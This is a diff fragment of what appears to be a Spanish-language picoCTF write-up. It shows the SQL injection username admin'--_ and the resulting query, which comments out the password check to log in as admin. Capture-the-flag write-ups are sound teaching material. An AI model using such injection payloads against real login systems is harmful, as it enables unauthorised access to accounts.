@@ -10,7 +10,7 @@ There is a website running at `https://jupiter.challenges.picoctf.org/problem/3
 ## Solución  1
 ```
 usamos el usuario `admin'--_` para comentar el resto de la consulta, ignorando la verificación de contraseña.
-username: admin'--_
+	username: admin'--_
 password: hola
 SQL query: SELECT * FROM users WHERE name='admin'--_' AND password='hola'
 
